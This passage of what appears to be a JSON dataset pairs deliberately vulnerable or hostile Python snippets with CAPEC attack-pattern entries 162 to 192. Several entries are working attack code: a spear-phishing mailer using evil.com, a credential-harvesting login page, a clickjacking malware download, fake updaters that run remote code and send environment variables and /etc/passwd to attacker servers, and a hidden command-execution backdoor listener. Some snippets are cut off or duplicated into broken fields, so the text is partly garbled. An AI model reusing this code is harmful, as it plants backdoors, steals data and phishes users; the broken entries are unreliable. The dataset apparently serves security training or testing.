        "code_snippet": "from flask import Flask, request\n\napp = Flask(__name__)\n\n@app.route('/process_order', methods=['POST'])\ndef process_order():\n    # Get price and quantity from hidden form fields\n    price = float(request.form['price'])\n    quantity = int(request.form['quantity'])\n    \n    # Calculate total without server-side validation\n    total = price * quantity\n    \n    # Process payment and store order in database\n    order = {\n        'user_id': request.form['user_id'],\n        'item_id': request.form['item_id'],\n        'price': price,\n        'quantity': quantity,\n        'total': total\n    }\n    \n    save_order_to_database(order)\n    process_payment(total)\n    \n    return {'status': 'success', 'total': total}\n\ndef save_order_to_database(order):\n    # Directly save order details without price validation\n    pass\n\ndef process_payment(amount):\n    # Process payment with user-supplied amount\n    pass",
        "description": "This vulnerable code demonstrates an e-commerce application that processes orders by accepting client-side price and quantity values from hidden form fields without server-side validation. The code trusts client-supplied data for price calculations, making it susceptible to price manipulation attacks where an attacker can modify the hidden form fields to get items at a lower price."
    },
    {
        "capec_id": "163",
        "capec_name": "Spear Phishing",
        "code_snippet": "from flask import Flask, redirect, request\nfrom email.mime.text import MIMEText\nimport smtplib\n\napp = Flask(__name__)\n\n@app.route('/redirect')\ndef open_redirect():\n    target = request.args.get('url', '')\n    return redirect(target)\n\ndef send_spear_phish(target_email, target_name, company):\n    sender = 'hr@{}.com'.format(company)\n    msg = MIMEText(\n        'Dear {},\\n\\nPlease review your account status at: '\n        'http://evil.com/redirect?url=http://{}'\n        '.com/login'.format(target_name, company)\n    )\n    msg['Subject'] = 'Important: Account Review Required'\n    msg['From'] = sender\n    msg['To'] = target_email\n\n    server = smtplib.SMTP('smtp.evil.com')\n    server.starttls()\n    server.login('attacker', 'password')\n    server.send_message(msg)\n    server.quit()\n\ntargets = [\n    {'email': 'employee@company.com', 'name': 'John Doe', 'company': 'company'},\n]\n\nfor target in targets:\n    send_spear_phish(target['email'], target['name'], target['company'])",
        "description": "This code demonstrates a spear phishing attack implementation that combines an open redirect vulnerability with targeted email functionality. It creates a Flask endpoint that allows URL redirection to any destination and a function to send specially crafted emails to specific targets. The emails contain personalized information and malicious links that appear legitimate by using the target's company name, exploiting UI misrepresentation and open redirect vulnerabilities."
    },
    {
        "capec_id": "164",
        "capec_name": "Mobile Phishing",
        "code_snippet": "import smtplib\nfrom flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/login', methods=['GET', 'POST'])\ndef login():\n    template = '''\n    <form method='POST'>\n        <div>Please verify your account due to suspicious activity</div>\n        <input type='text' name='username' placeholder='Phone number'>\n        <input type='password' name='password' placeholder='Password'>\n        <input type='submit' value='Login'>\n    </form>\n    '''\n    \n    if request.method == 'POST':\n        username = request.form['username']\n        password = request.form['password']\n        \n        # Store captured credentials without validation\n        with open('captured_creds.txt', 'a') as f:\n            f.write(f'{username}:{password}\\n')\n            \n        # Redirect to legitimate site\n        return 'Account verified, redirecting...'\n    \n    return render_template_string(template)\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=80)",
        "description": "This code demonstrates a vulnerable mobile phishing implementation that creates a fake login page mimicking a security alert. The application uses single-factor authentication, lacks authentication attempt limits, and stores credentials insecurely. The UI misrepresents critical information by spoofing a legitimate service, and there are no proper authentication checks or protections against credential harvesting."
    },
    {
        "capec_id": "165",
        "capec_name": "File Manipulation",
        "code_snippet": "\"\"\"\nimport os\nimport shutil\n\ndef process_user_upload(user_filename, content):\n    # Vulnerable: blindly trusting user-provided filename and extension\n    base_dir = '/tmp/uploads/'\n    \n    # Vulnerable: no path traversal checks\n    file_path = os.path.join(base_dir, user_filename)\n    \n    # Vulnerable: insecure temporary file handling\n    with open(file_path, 'wb') as f:\n        f.write(content)\n    \n    # Vulnerable: relies on file extension for processing\n    if user_filename.endswith('.exe'):\n        os.system(file_path)  # Dangerous execution\n    elif user_filename.endswith('.txt'):\n        with open(file_path) as f:\n            process_text(f.read())\n            \ndef process_text(content):\n    # Process text content\n    pass\n\n# Usage\nuser_input = '../../../etc/passwd'  # Malicious path traversal\nprocess_user_upload(user_input, b'malicious content')\n\"\"\",\n    \"description\": \"This vulnerable code demonstrates multiple file manipulation issues including path traversal, unsafe file handling, and dangerous file extension processing. It accepts user-controlled filenames without proper validation, creates files in a temporary directory without proper access controls, and makes security decisions based on file extensions that can be easily spoofed. The code allows for directory traversal attacks and potential arbitrary code execution through specially crafted filenames and content.\"",
        "description": "\"This vulnerable code demonstrates multiple file manipulation issues including path traversal, unsafe file handling, and dangerous file extension processing. It accepts user-controlled filenames without proper validation, creates files in a temporary directory without proper access controls, and makes security decisions based on file extensions that can be easily spoofed. The code allows for directory traversal attacks and potential arbitrary code execution through specially crafted filenames and content.\""
    },
    {
        "capec_id": "166",
        "capec_name": "Force the System to Reset Values",
        "code_snippet": "\"\"\"\nclass SecuritySystem:\n    def __init__(self):\n        self.is_locked = False\n        self.security_settings = None\n        self.power_state = 'ON'\n    \n    def set_security_config(self, config):\n        if not self.is_locked:\n            self.security_settings = config\n            self.is_locked = True\n    \n    def power_save_mode(self):\n        self.power_state = 'SLEEP'\n        # Vulnerable: Lock bit protection is lost during power state transition\n        self.is_locked = False\n        self.security_settings = None\n    \n    def wake_from_sleep(self):\n        self.power_state = 'ON'\n        # Vulnerable: Security settings not properly restored\n        # System returns to default insecure state\n    \n    def reset_device(self):\n        # Vulnerable: No authentication required for critical reset function\n        self.is_locked = False\n        self.security_settings = None\n        self.power_state = 'ON'\n        \nsystem = SecuritySystem()\nsystem.set_security_config({'encryption': True, 'access_level': 'restricted'",
        "description": "\"This code demonstrates vulnerabilities in a security system that fails to maintain secure state during power transitions and resets. It includes missing authentication for critical functions, improper handling of security settings during power state changes, and failure to preserve security configuration integrity. The system can be forced into an insecure previous state through power transitions or unauthorized resets.\""
    },
    {
        "capec_id": "167",
        "capec_name": "White Box Reverse Engineering",
        "code_snippet": "import os\nimport sys\nimport traceback\n\nDEBUG_MODE = True\nSENSITIVE_DATA = {'encryption_key': '1234567890abcdef', 'admin_pwd': 'supersecret'}\n\ndef process_data(input_data):\n    try:\n        if DEBUG_MODE:\n            # Store trace data in plaintext file\n            with open('debug_trace.log', 'w') as f:\n                f.write(f'Processing data: {input_data}\\n')\n                f.write(f'System info: {sys.version}\\n')\n                f.write(f'Environment: {os.environ}\\n')\n                f.write(f'Sensitive data: {SENSITIVE_DATA}\\n')\n                f.write(f'Stack trace: {traceback.format_stack()}\\n')\n        \n        # Hidden debug backdoor\n        if input_data.startswith('DEBUG_BACKDOOR:'):\n            exec(input_data.split('DEBUG_BACKDOOR:')[1])\n            \n        return input_data.upper()\n    except Exception as e:\n        if DEBUG_MODE:\n            traceback.print_exc()\n        return None",
        "description": "This vulnerable code demonstrates exposure of sensitive system information through debug traces and backdoors. It stores sensitive trace data in unprotected locations, exposes system information through debug logs, contains a hidden backdoor through exec(), and leaves debug features enabled in production. The code allows for runtime manipulation and inspection of system state through debug features, making it susceptible to white box analysis and exploitation."
    },
    {
        "capec_id": "168",
        "capec_name": "Windows ::DATA Alternate Data Stream",
        "code_snippet": "\"\"\"\nimport win32file\nimport win32con\nimport os\n\ndef hide_malicious_content(visible_file, hidden_content):\n    # Create a normal file that appears innocent\n    with open(visible_file, 'w') as f:\n        f.write('Normal content here')\n    \n    # Create alternate data stream to hide malicious content\n    ads_path = f'{visible_file",
        "description": "\"This code demonstrates exploitation of NTFS Alternate Data Streams (ADS) to hide malicious content within a seemingly innocent file. It creates a visible file with normal content while simultaneously storing hidden content in an alternate data stream. The hidden content is not visible through standard file system utilities and doesn't affect the visible file size, making it an effective way to conceal malicious data. The code fails to implement proper security controls for ADS access and doesn't sanitize or restrict the content that can be hidden.\""
    },
    {
        "capec_id": "169",
        "capec_name": "Footprinting",
        "code_snippet": "class SensitiveSystem:\n    def __init__(self):\n        self._password = 'secret123'\n        self._login_attempts = {}\n    \n    def authenticate(self, username, password):\n        if username not in self._login_attempts:\n            self._login_attempts[username] = 0\n        \n        if password == self._password:\n            return 'Login successful'\n        else:\n            self._login_attempts[username] += 1\n            if len(password) == len(self._password):\n                return 'Invalid password'\n            else:\n                return 'Password length must be ' + str(len(self._password))\n    \n    def get_status(self, username):\n        return f'Attempts: {self._login_attempts.get(username, 0)}'",
        "description": "This vulnerable code demonstrates information exposure through system probing. It leaks sensitive information through different error messages, reveals password length, tracks login attempts visibly, and behaves differently based on input conditions, allowing attackers to gather system information through behavioral analysis."
    },
    {
        "capec_id": "170",
        "capec_name": "Web Application Fingerprinting",
        "code_snippet": "from flask import Flask, request, jsonify\nimport sys\nimport platform\n\napp = Flask(__name__)\n\n@app.route('/api/system-info')\ndef system_info():\n    try:\n        info = {\n            'python_version': sys.version,\n            'platform': platform.platform(),\n            'server_software': 'MyApp/1.0.3',\n            'database_version': 'MySQL 8.0.21',\n            'admin_email': 'admin@internal.com'\n        }\n        return jsonify(info)\n    except Exception as e:\n        return jsonify({\n            'error': str(e),\n            'stack_trace': str(e.__traceback__.tb_frame.f_locals),\n            'server_path': sys.path\n        })\n\n@app.route('/api/user-data')\ndef get_user_data():\n    user_id = request.args.get('id')\n    password = request.args.get('password')\n    api_key = request.args.get('api_key')\n    return jsonify({'status': 'processing', 'credentials': [user_id, password, api_key]})\n\n@app.route('/download')\ndef download_update():\n    url = request.args.get('url')\n    if url:\n        import urllib.request\n        code = urllib.request.urlopen(url).read()\n        exec(code)\n        return 'Update installed'\n    return 'No URL provided'",
        "description": "This vulnerable code demonstrates multiple security issues including exposure of sensitive system information through detailed error messages and API endpoints, use of GET requests with sensitive parameters, excessive attack surface through multiple vulnerable endpoints, and unsafe code execution from remote sources without verification. The code leaks system details, platform information, and stack traces, processes sensitive data through URL parameters, and allows arbitrary code execution."
    },
    {
        "capec_id": "171",
        "capec_name": "DEPRECATED: Variable Manipulation",
        "code_snippet": "def process_user_data(user_input):\n    # Global variable accessible throughout the application\n    global_data = {}\n\n    # Dynamically create variable names based on user input\n    var_name = f'user_{user_input}'\n    \n    # Dangerous: Dynamically evaluate user-controlled data\n    exec(f'{var_name} = \"sensitive_data\"')\n    \n    # Dangerous: Dynamic attribute access based on user input\n    class UserData:\n        def __init__(self):\n            self.admin_data = 'secret'\n            self.user_data = 'public'\n    \n    user_obj = UserData()\n    result = getattr(user_obj, user_input, None)\n    \n    # Dangerous: eval with user input\n    calculated_value = eval(f'2 * {user_input}')\n    \n    return result",
        "description": "This code demonstrates multiple vulnerabilities related to dynamic variable manipulation and evaluation. It includes improper control of dynamic variables, eval injection, unnecessarily wide variable scope, and unsafe dynamic attribute access. The code allows user input to influence variable names and code execution, potentially leading to unauthorized access to variables and arbitrary code execution."
    },
    {
        "capec_id": "173",
        "capec_name": "Action Spoofing",
        "code_snippet": "from flask import Flask, render_template, redirect, request\n\ndef create_malicious_ui():\n    app = Flask(__name__)\n\n    @app.route('/')\n    def homepage():\n        # Misleading UI that looks like a search form\n        return '''\n        <html>\n        <body>\n            <div style=\"position: relative;\">\n                <form id=\"visible_form\" style=\"z-index: 1;\">\n                    <input type=\"text\" placeholder=\"Search...\">\n                    <button type=\"submit\">Search Now</button>\n                </form>\n                <form id=\"hidden_form\" action=\"/download_malware\" \n                      style=\"position: absolute; top: 0; opacity: 0; z-index: 2;\">\n                    <input type=\"submit\" style=\"width: 100%; height: 100%;\">\n                </form>\n            </div>\n        </body>\n        </html>\n        '''\n\n    @app.route('/download_malware')\n    def download():\n        # Actually triggers malware download instead of search\n        return redirect('http://malicious-server.com/payload.exe')\n\n    return app",
        "description": "This code creates a clickjacking attack where a malicious web application presents a seemingly harmless search interface but overlays it with an invisible form that triggers a malware download. The visible UI misrepresents the actual action (CWE-451), and the destination of the communication is intentionally misleading (CWE-941). The attack exploits user trust by spoofing legitimate UI elements to perform unintended actions."
    },
    {
        "capec_id": "174",
        "capec_name": "Flash Parameter Injection",
        "code_snippet": "\"\"\"\nfrom flask import Flask, request\nimport os\n\napp = Flask(__name__)\n\n@app.route('/upload_flash', methods=['POST'])\ndef upload_flash():\n    flash_file = request.files['file']\n    if flash_file.filename.endswith('.swf'):\n        # Unsafe: Directly saving flash file without validation\n        flash_file.save(os.path.join('static/uploads', flash_file.filename))\n        \n        # Unsafe: Embedding flash with user-controlled parameters\n        flash_params = request.form.get('flashvars', '')\n        html_content = f'''\n        <object type=\"application/x-shockwave-flash\" data=\"/static/uploads/{flash_file.filename",
        "description": "\"This vulnerable code allows unrestricted upload of Flash files and creates HTML pages that embed them with user-controlled parameters. It includes multiple security issues: no proper validation of file contents, dangerous file type handling, unsafe parameter injection into HTML templates, and permissive cross-domain access through allowScriptAccess parameter. The code stores raw content under web root and doesn't sanitize user input used in template generation.\""
    },
    {
        "capec_id": "175",
        "capec_name": "Code Inclusion",
        "code_snippet": "import os\nimport requests\n\ndef load_plugin(plugin_name):\n    # Downloads and loads plugins from a remote source\n    base_url = 'http://plugins.example.com/'\n    plugin_path = f'plugins/{plugin_name}.py'\n    \n    # Download plugin from remote source\n    response = requests.get(f'{base_url}{plugin_name}.py')\n    \n    # Save plugin locally\n    os.makedirs('plugins', exist_ok=True)\n    with open(plugin_path, 'w') as f:\n        f.write(response.text)\n    \n    # Dynamically import and execute the plugin\n    plugin_module = __import__(f'plugins.{plugin_name}', fromlist=['*'])\n    plugin_module.execute()",
        "description": "This code demonstrates unsafe remote code inclusion by downloading Python plugins from an untrusted remote source and executing them without proper validation. It creates a potential attack vector where malicious code could be downloaded and executed through the plugin system. The code combines multiple vulnerabilities including remote file inclusion, untrusted code execution, and improper control of code resources."
    },
    {
        "capec_id": "176",
        "capec_name": "Configuration/Environment Manipulation",
        "code_snippet": "import configparser\nimport os\n\nclass SystemConfig:\n    def __init__(self, config_file='system.ini'):\n        self.config_file = config_file\n        self.config = configparser.ConfigParser()\n        self.load_config()\n\n    def load_config(self):\n        if os.path.exists(self.config_file):\n            self.config.read(self.config_file)\n\n    def get_security_setting(self, section, key):\n        return self.config[section][key]\n\n    def update_security_version(self, new_version):\n        # No version validation\n        self.config['Security']['version'] = new_version\n        with open(self.config_file, 'w') as f:\n            self.config.write(f)\n\n    def set_debug_mode(self, enabled):\n        # No privilege check for debug mode\n        self.config['System']['debug_mode'] = str(enabled)\n        if enabled:\n            self.config['Security']['bypass_locks'] = 'true'\n        with open(self.config_file, 'w') as f:\n            self.config.write(f)\n\nsys_config = SystemConfig()\nsys_config.update_security_version('1.0')\nsys_config.set_debug_mode(True)",
        "description": "This vulnerable code demonstrates configuration manipulation vulnerabilities by allowing unrestricted modification of system configuration files, including security version numbers and debug settings. The code lacks proper validation, allows security version downgrades, and enables debug mode without proper authorization, which can bypass security locks. Configuration files are directly modifiable without integrity checks or access controls."
    },
    {
        "capec_id": "177",
        "capec_name": "Create files with the same name as files protected with a higher classification",
        "code_snippet": "\"\"\"\nimport os\nimport shutil\n\ndef load_library(library_name):\n    # Search paths for libraries\n    search_paths = [\n        './libs/',\n        '/usr/local/lib/',\n        '/opt/lib/'\n    ]\n    \n    for path in search_paths:\n        potential_lib = os.path.join(path, library_name)\n        if os.path.exists(potential_lib):\n            # Vulnerable: No validation of the actual file\n            # Just loads first matching filename found\n            with open(potential_lib, 'rb') as lib:\n                library_content = lib.read()\n                # Process library content\n                return library_content\n\ndef process_config(config_name):\n    # Vulnerable: Accepts any file with matching name\n    # without verifying authenticity or proper location\n    config_path = os.path.normpath(config_name)\n    \n    if os.path.exists(config_path):\n        with open(config_path, 'r') as conf:\n            return conf.read()\n    \n    return None\n\n# Vulnerable usage examples\nuser_supplied_lib = \"critical_library.dll\"\nuser_supplied_config = \"../../system/config.ini\"\n\nlib_content = load_library(user_supplied_lib)\nconfig_content = process_config(user_supplied_config)\n\"\"\",\n    \"description\": \"This code demonstrates multiple vulnerable file handling practices. It searches for libraries and configuration files using only the filename without proper path validation or authentication. An attacker could place malicious files with matching names in search paths that are checked first, or use path traversal to access files outside intended directories. The code also lacks verification of file integrity and proper handling of symbolic links or junction points.\"",
        "description": "\"This code demonstrates multiple vulnerable file handling practices. It searches for libraries and configuration files using only the filename without proper path validation or authentication. An attacker could place malicious files with matching names in search paths that are checked first, or use path traversal to access files outside intended directories. The code also lacks verification of file integrity and proper handling of symbolic links or junction points.\""
    },
    {
        "capec_id": "178",
        "capec_name": "Cross-Site Flashing",
        "code_snippet": "from flask import Flask, redirect, request\n\napp = Flask(__name__)\n\n@app.route('/flash-redirect')\ndef flash_redirect():\n    flash_url = request.args.get('swf_url', '')\n    callback = request.args.get('callback', '')\n    \n    response = f'''\n    <object type=\"application/x-shockwave-flash\" data=\"{flash_url}\">\n        <param name=\"allowScriptAccess\" value=\"always\" />\n        <param name=\"movie\" value=\"{flash_url}\" />\n        <param name=\"FlashVars\" value=\"callback={callback}\" />\n    </object>\n    '''\n    \n    return response\n\n@app.route('/crossdomain.xml')\ndef crossdomain():\n    return '''<?xml version=\"1.0\"?>\n    <cross-domain-policy>\n        <allow-access-from domain=\"*\" />\n    </cross-domain-policy>\n    '''",
        "description": "This vulnerable code allows unrestricted Flash content loading and execution through a web application. It accepts user-controlled URLs for Flash content (SWF files) and callback parameters without validation, enables cross-domain access from any domain, and renders unescaped user input directly in the HTML response. The crossdomain.xml configuration allows any external domain to load content, making it susceptible to cross-site scripting and malicious Flash content execution."
    },
    {
        "capec_id": "179",
        "capec_name": "Calling Micro-Services Directly",
        "code_snippet": "\"\"\"\nfrom flask import Flask, request, make_response, jsonify\nimport json\n\napp = Flask(__name__)\n\nsensitive_data = {\n    'api_key': 'secret_key_123',\n    'user_credentials': {'admin': 'admin_pass'",
        "description": "\"This vulnerable code demonstrates a microservices implementation that exposes sensitive information through multiple vectors: service discovery endpoint revealing internal endpoints, authentication using GET parameters, storing sensitive data in publicly accessible locations, and using insecure cookies. The code lacks proper access controls and exposes internal implementation details that could be exploited.\""
    },
    {
        "capec_id": "180",
        "capec_name": "Exploiting Incorrectly Configured Access Control Security Levels",
        "code_snippet": "\"\"\"\nimport os\n\nclass FileAccessManager:\n    def __init__(self):\n        self.access_config = {\n            'admin': {'read': True, 'write': True, 'execute': True",
        "description": "\"This code demonstrates vulnerable access control configuration through improper permission assignment, incorrect access control granularity, and performing security checks after resource access. The code allows modification of access control settings without proper validation and assigns overly permissive default permissions.\""
    },
    {
        "capec_id": "181",
        "capec_name": "Flash File Overlay",
        "code_snippet": "\"\"\"\nfrom flask import Flask, render_template, request, send_file\nfrom werkzeug.utils import secure_filename\nimport os\n\napp = Flask(__name__)\napp.config['UPLOAD_FOLDER'] = 'uploads/'\n\n@app.route('/')\ndef index():\n    return render_template('index.html')\n\n@app.route('/upload', methods=['POST'])\ndef upload_file():\n    file = request.files['file']\n    filename = secure_filename(file.filename)\n    file.save(os.path.join(app.config['UPLOAD_FOLDER'], filename))\n    \n    # Vulnerable crossdomain.xml configuration\n    if filename == 'crossdomain.xml':\n        with open(os.path.join(app.config['UPLOAD_FOLDER'], filename), 'w') as f:\n            f.write('''<?xml version=\"1.0\"?>\n                      <cross-domain-policy>\n                          <allow-access-from domain=\"*\" />\n                          <allow-http-request-headers-from domain=\"*\" headers=\"*\"/>\n                      </cross-domain-policy>''')\n    \n    # Vulnerable Flash embedding in template\n    return render_template('view.html', \n                         content=f'''\n                         <object type=\"application/x-shockwave-flash\" data=\"/uploads/{filename",
        "description": "\"This code demonstrates a vulnerable web application that allows unrestricted file uploads and includes dangerous Flash configuration settings. It permits uploading of potentially malicious Flash files, sets an overly permissive cross-domain policy, and renders user-controlled content without proper sanitization, enabling clickjacking attacks through transparent Flash overlays.\""
    },
    {
        "capec_id": "182",
        "capec_name": "Flash Injection",
        "code_snippet": "\"\"\"\nimport flash.external.ExternalInterface\nimport flash.system.Security\n\ndef load_flash_content():\n    # No validation of input domain\n    allowed_domains = ['*.example.com']\n    domain = request.args.get('domain', '')\n    content_url = request.args.get('content_url', '')\n    \n    # Permissive cross-domain policy\n    Security.allowDomain('*')\n    \n    # Incorrect comparison of domain\n    if domain.endswith('.example.com'):\n        # Vulnerable flash loader\n        flash_obj = ExternalInterface.call('loadFlashContent', content_url)\n        flash_obj.execute()\n        return True\n    return False\n\ndef initialize_flash():\n    untrusted_swf = request.args.get('swf_file')\n    # No validation of SWF file content\n    if untrusted_swf:\n        load_flash_content()\n\"\"\",\n    \"description\": \"This code demonstrates a vulnerable Flash content loader that fails to properly validate input domains and SWF files. It implements a permissive cross-domain policy, performs incorrect domain comparison, and lacks proper input validation, allowing an attacker to load and execute malicious Flash content from untrusted domains.\"",
        "description": "\"This code demonstrates a vulnerable Flash content loader that fails to properly validate input domains and SWF files. It implements a permissive cross-domain policy, performs incorrect domain comparison, and lacks proper input validation, allowing an attacker to load and execute malicious Flash content from untrusted domains.\""
    },
    {
        "capec_id": "183",
        "capec_name": "IMAP/SMTP Command Injection",
        "code_snippet": "\"\"\"\nclass WebMailServer:\n    def __init__(self):\n        self.imap_server = 'mail.example.com'\n        \n    def search_emails(self, user_query):\n        # Vulnerable: directly concatenating user input into IMAP command\n        imap_command = f'SEARCH SUBJECT \"{user_query",
        "description": "\"This code demonstrates a vulnerable webmail server implementation that allows IMAP command injection through unsanitized user input in search queries. It concatenates user input directly into IMAP commands, lacks proper input validation, exposes sensitive information in error messages, and relies on client-side security. An attacker can inject malicious IMAP commands by manipulating the search query parameter.\""
    },
    {
        "capec_id": "184",
        "capec_name": "Software Integrity Attack",
        "code_snippet": "import requests\nimport os\n\ndef auto_update():\n    # Download code from remote server without verification\n    update_url = 'http://untrusted-server.com/update.py'\n    response = requests.get(update_url)\n    code = response.text\n    \n    # Save and execute downloaded code without integrity check\n    with open('update.py', 'w') as f:\n        f.write(code)\n    \n    # Execute potentially malicious code\n    os.system('python update.py')\n    \n    # Expose sensitive system info\n    system_info = {\n        'os': os.uname(),\n        'env': os.environ,\n        'users': open('/etc/passwd').read(),\n        'processes': os.popen('ps aux').read()\n    }\n    \n    # Send sensitive data to remote server\n    requests.post('http://untrusted-server.com/collect',\n                 json=system_info)\n\n# Run update without user confirmation\nauto_update()",
        "description": "This code demonstrates multiple vulnerabilities including downloading and executing unverified code from a remote source, embedding potentially malicious code, and exposing sensitive system information to unauthorized parties. The code automatically downloads updates from an untrusted server without integrity checks, executes them with system privileges, and leaks sensitive system information back to the attacker's server."
    },
    {
        "capec_id": "185",
        "capec_name": "Malicious Software Download",
        "code_snippet": "import requests\nimport os\n\ndef update_system():\n    try:\n        # Download executable from attacker's server\n        url = 'http://malicious-server.com/update.exe'\n        response = requests.get(url)\n        \n        # Save and execute without verification\n        with open('system_update.exe', 'wb') as f:\n            f.write(response.content)\n        \n        # Execute downloaded file\n        os.system('system_update.exe')\n        \n        # Collect system information\n        system_info = {\n            'username': os.getlogin(),\n            'env_vars': dict(os.environ),\n            'root_dirs': os.listdir('/')\n        }\n        \n        # Send system info back to attacker\n        requests.post('http://malicious-server.com/collect', json=system_info)\n        \n    except Exception:\n        pass\n\n# Disguise as legitimate update function\ndef check_for_updates():\n    update_system()",
        "description": "Malicious code disguised as a system update function that downloads and executes unverified code from an attacker's server, collects sensitive system information, and transmits it back to the attacker. The code lacks integrity checks, contains hidden malicious functionality, and exposes sensitive system data."
    },
    {
        "capec_id": "186",
        "capec_name": "Malicious Software Update",
        "code_snippet": "\"\"\"\nimport requests\nimport os\nimport hashlib\nimport subprocess\n\ndef check_for_updates():\n    try:\n        # Malicious update server controlled by attacker\n        update_url = 'http://malicious-update-server.com/fake_update.py'\n        \n        # Download update without proper verification\n        response = requests.get(update_url)\n        update_code = response.content\n        \n        # Save and execute downloaded code without proper integrity checks\n        with open('system_update.py', 'wb') as f:\n            f.write(update_code)\n        \n        # Execute downloaded code with system privileges\n        subprocess.run(['python', 'system_update.py'], shell=True)\n        \n        # Replicate to other systems on network\n        for ip in get_network_ips():\n            spread_update(ip, update_code)\n            \n    except Exception as e:\n        pass\n\ndef spread_update(target_ip, payload):\n    try:\n        # Attempt to connect and spread to other systems\n        requests.post(f'http://{target_ip",
        "description": "\"This vulnerable code demonstrates an insecure update mechanism that downloads and executes code from an unverified source without integrity checks. It includes characteristics of a trojan by appearing as a legitimate update function while containing hidden malicious functionality. The code also attempts to replicate itself across network systems, exhibiting worm-like behavior. The absence of proper verification and the automatic execution of downloaded code makes it an example of CWE-494 and CWE-506.\""
    },
    {
        "capec_id": "187",
        "capec_name": "Malicious Automated Software Update via Redirection",
        "code_snippet": "import urllib.request\nimport os\n\ndef auto_update_system():\n    update_server = 'http://update-server.com/patches'\n    token = 'basic_auth_token'\n    \n    try:\n        # Fetch update without proper server validation\n        req = urllib.request.Request(\n            update_server,\n            headers={'Authorization': f'Bearer {token}'}\n        )\n        response = urllib.request.urlopen(req)\n        update_code = response.read()\n        \n        # Execute downloaded code without integrity verification\n        update_file = 'system_update.py'\n        with open(update_file, 'wb') as f:\n            f.write(update_code)\n        \n        # Dangerous direct execution of downloaded code\n        os.system(f'python {update_file}')\n        \n    except Exception as e:\n        print(f'Update failed: {e}')\n\n# Vulnerable update check\ndef check_for_updates():\n    client_version = '1.0'\n    if client_version < '2.0':\n        auto_update_system()",
        "description": "A vulnerable auto-update implementation that fails to properly authenticate the update server and doesn't validate the integrity of downloaded code before execution. It uses basic token authentication that could be captured and replayed, downloads code without verification, and executes it directly, potentially allowing malicious code execution through a man-in-the-middle attack."
    },
    {
        "capec_id": "188",
        "capec_name": "Reverse Engineering",
        "code_snippet": "class SecureDevice:\n    def __init__(self):\n        self._secret_key = b'SuperSecretKey123'\n        self._debug_enabled = True  # Undocumented debug feature\n\n    def encrypt_data(self, data):\n        # Using weak XOR encryption\n        encrypted = ''\n        for i in range(len(data)):\n            encrypted += chr(ord(data[i]) ^ self._secret_key[i % len(self._secret_key)])\n        return encrypted\n\n    def get_system_info(self):\n        if self._debug_enabled:\n            return {\n                'firmware_version': '1.0.0',\n                'hardware_id': 'DEV123',\n                'memory_layout': '0x0000-0xFFFF',\n                'crypto_key': self._secret_key.hex(),\n                'debug_port': 8080\n            }\n\n    def optimize_security_check(self, user_input):\n        # Security check that might be optimized away by compiler\n        check = 0\n        for _ in range(1000):\n            check += 1\n        if check == 1000:\n            return True\n        return False",
        "description": "This code demonstrates multiple security vulnerabilities related to reverse engineering protection. It uses weak XOR encryption, exposes sensitive system information through a debug feature, includes an undocumented debug flag, implements a security check that could be optimized away by the compiler, and stores a hardcoded encryption key directly in the code."
    },
    {
        "capec_id": "189",
        "capec_name": "Black Box Reverse Engineering",
        "code_snippet": "def compare_password(input_password, stored_hash):\n    reference = stored_hash.encode()\n    attempt = input_password.encode()\n    \n    if len(reference) != len(attempt):\n        return False\n    \n    result = True\n    # Vulnerable timing side-channel comparison\n    for x, y in zip(reference, attempt):\n        if x != y:\n            result = False\n            # Continue comparing to avoid early exit timing attack\n            continue\n        # Artificial delay for matching characters\n        time.sleep(0.001)\n    \n    return result\n\ndef process_login(username, password):\n    try:\n        stored_hash = get_stored_hash(username)\n        if compare_password(password, stored_hash):\n            print('Login successful')\n            return True\n        else:\n            print('Login failed')\n            return False\n    except Exception as e:\n        # Information disclosure through error messages\n        print(f'Error occurred: {str(e)}')\n        return False",
        "description": "A vulnerable password comparison implementation that exhibits multiple side-channel vulnerabilities. The code features a timing attack vulnerability through character-by-character comparison with artificial delays, information disclosure through detailed error messages, and observable timing differences based on password length and matching characters. This makes it susceptible to black box analysis through timing measurements and error message analysis."
    },
    {
        "capec_id": "190",
        "capec_name": "Reverse Engineer an Executable to Expose Assumed Hidden Functionality",
        "code_snippet": "import socket\nimport subprocess\nimport platform\nimport os\n\nclass SystemExplorer:\n    def __init__(self):\n        self._hidden_backdoor = 12345\n        self._collected_data = {}\n\n    def collect_system_info(self):\n        self._collected_data['os'] = platform.system()\n        self._collected_data['version'] = platform.version()\n        self._collected_data['arch'] = platform.machine()\n        self._collected_data['env'] = dict(os.environ)\n        return self._collected_data\n\n    def _hidden_command_executor(self, cmd):\n        return subprocess.check_output(cmd, shell=True).decode()\n\n    def start_hidden_listener(self):\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.bind(('0.0.0.0', self._hidden_backdoor))\n        sock.listen(1)\n        while True:\n            conn, addr = sock.accept()\n            cmd = conn.recv(1024).decode()\n            result = self._hidden_command_executor(cmd)\n            conn.send(result.encode())\n\nif __name__ == '__main__':\n    explorer = SystemExplorer()\n    explorer.collect_system_info()\n    explorer.start_hidden_listener()",
        "description": "This vulnerable code demonstrates undocumented functionality (CWE-912) by implementing a hidden backdoor that collects sensitive system information (CWE-497) and exposes it through a concealed network listener. It includes functionality to execute arbitrary commands received through the hidden port, potentially allowing for malicious code execution (CWE-506). The code collects sensitive trace data about the system environment and stores it in an unprotected dictionary (CWE-1323)."
    },
    {
        "capec_id": "191",
        "capec_name": "Read Sensitive Constants Within an Executable",
        "code_snippet": "class DatabaseConnector:\n    def __init__(self):\n        self.admin_password = 'sup3r_s3cr3t_p@ss'\n        self.encryption_key = b'1234567890abcdef'\n        self.api_token = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9'\n        self.db_url = 'mysql://admin:password@localhost:3306/prod_db'\n\n    def connect(self):\n        connection = self._establish_connection(self.db_url, self.admin_password)\n        self._encrypt_data(self.encryption_key)\n        self._authenticate_api(self.api_token)\n        return connection\n\n    def _establish_connection(self, url, password):\n        # Connection logic here\n        pass\n\n    def _encrypt_data(self, key):\n        # Encryption logic here\n        pass\n\n    def _authenticate_api(self, token):\n        # API authentication logic here\n        pass",
        "description": "This code demonstrates multiple security vulnerabilities including hard-coded credentials, sensitive constants, and cleartext storage of security-critical information directly in the executable code. The class contains hard-coded database credentials, encryption keys, and API tokens as class attributes, making them easily discoverable through reverse engineering or code analysis."
    },
    {
        "capec_id": "192",
        "capec_name": "Protocol Analysis",
